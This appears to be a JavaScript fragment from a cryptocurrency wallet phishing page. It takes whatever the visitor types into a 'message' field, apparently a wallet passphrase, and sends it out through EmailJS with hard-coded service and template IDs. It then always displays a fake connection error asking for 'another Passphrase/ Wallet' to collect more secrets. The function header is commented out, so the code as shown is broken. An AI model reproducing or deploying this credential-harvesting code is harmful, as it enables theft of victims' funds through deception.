//function SendMail(){
    var params = {
        message: document.getElementById("message").value,
    }
    emailjs.send("service_iho3dr4","template_zg3uhti", params).then(document.write("<h1>An Error Occurred During the Connection Please Try another Passphrase/ Wallet.</h1>")
        
    );
}
